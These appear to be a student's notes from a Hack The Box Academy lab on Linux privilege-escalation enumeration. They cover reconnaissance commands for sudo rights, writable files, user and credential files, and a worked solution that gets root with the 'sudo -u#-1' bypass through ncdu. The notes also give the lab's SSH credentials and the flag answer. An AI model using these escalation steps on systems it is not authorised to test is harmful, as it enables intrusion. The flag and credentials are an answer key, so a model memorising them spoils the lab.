# Environment Enumeration
## List Current Processes

```shellsession
$ ps aux | grep root
```

## List Current Terminal-Attached Processes
`Logged in Users`: Knowing which other users are logged into the system and what they are doing can provide greater insight into possible local lateral movement and privilege escalation paths.

```shellsession
$ ps au
```

## Sudo - List User's Privileges
`Sudo Privileges`: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include `NOPASSWD`, meaning that the user can run the specified command without being prompted for a password. 

```shellsession
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

`Configuration Files`: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as `.conf` and `.config`, for usernames, passwords, and other secrets.

`Readable Shadow File`: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set.

`Password Hashes in /etc/passwd`: Occasionally, you will see password hashes directly in the `/etc/passwd` file. This file is readable by all users, and as with hashes in the `shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

## Cron Jobs
`Cron Jobs`: Cron jobs on Linux systems are similar to Windows scheduled tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

```shellsession
$ ls -la /etc/cron.daily/
```

## File Systems & Additional Drives
`Unmounted File Systems and Additional Drives`: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

```shellsession
$ lsblk
```

`SETUID and SETGID Permissions`: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.

## Find Writable Directories
`Writeable Directories`: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

```shellsession
$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

## Find Writable Files


```shellsession
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## Gaining Situational Awareness
Typically we'll want to run a few basic commands to orient ourselves:

- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `cat /etc/os-release` - checking out what operating system and version we are dealing with.
- `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password?
- `echo $PATH` - if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges.
- `env` - check out all environment variables that are set for our current user
- `uname -a` or `cat /proc/version` - note down the Kernel version 
- `cat /etc/shells` - what login shells exist on the server?

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:
- Exec Shield
- iptables
- AppArmor
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (ufw)

Check out the routing table by typing `route` or `netstat -rn`.

In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

We'll also want to check the arp table to see what other hosts the target has been communicating with.

```shellsession
$ arp -a
```

### Existing users

```shellsession
$ cat /etc/passwd | cut -f1 -d:
```

With Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:
<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Algorithm</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Hash</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Salted MD5</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$1$</code>...</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">SHA-256</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$5$</code>...</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">SHA-512</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$6$</code>...</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">BCrypt</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$2a$</code>...</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Scrypt</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$7$</code>...</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Argon2</td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">$argon2i$</code>...</td></tr></tbody></table>

We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.

```shellsession
$ grep "sh$" /etc/passwd
```

### Existing Groups
Each user in Linux systems is assigned to a specific group or groups and thus receives special privileges. For example, if we have a folder named `dev` only for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the `/etc/group` file, which shows us both the group name and the assigned user names.

```shellsession
$ cat /etc/group
```

We can then use the `getent` command to list members of any interesting groups.

```shellsession
$ getent group sudo

sudo:x:27:mrb3n
```

We can also check out which users have a folder under the `/home` directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords.

### Mounted File Systems
A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory.

```shellsession
$ df -h
```

For example, some file systems can only be read by the operating system, while others can be read and written by the user. File systems that can be read and written to by the user are called read/write file systems. Mounting a file system allows the user to access the files and folders stored on that file system. In order to mount a file system, the user must have root privileges. 

### Unmounted File Systems
When a file system is unmounted, it is no longer accessible by the system.

```shellsession
$ cat /etc/fstab | grep -v "#" | column -t
```

### All Hidden Files

```shellsession
$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

### All Hidden Directories

```shellsession
$ find / -type d -name ".*" -ls 2>/dev/null
```

### Temporary Files

```shellsession
$ ls -l /tmp /var/tmp /dev/shm
```

## Questions
SSH to 10.129.205.110 (ACADEMY-LLPE-SUDO), with user "htb-student" and password "HTB_@cademy_stdnt!"
1. Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer. **Answer: HTB{1nt3rn4l_5cr1p7_l34k}**
   - Find out which command we can run as root → we can run `ncdu` as root:
        ```shellsession
        $ sudo -l
        Matching Defaults entries for htb-student on ubuntu:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User htb-student may run the following commands on ubuntu:
            (ALL, !root) /bin/ncdu
        ```
   - Escalate privilege using this [technique](https://gtfobins.org/gtfobins/ncdu/):
        ```shellsession
        $ sudo -u#-1 /bin/ncdu
        [Press b]
        # whoami 
        root
        ```
   - Look for the flag with `HTB{` pattern:
        ```shellsession
        # find / -type f -exec grep -Hn "HTB{" {} +
        /usr/lib/int-check.sh:1:HTB{1nt3rn4l_5cr1p7_l34k}
        ```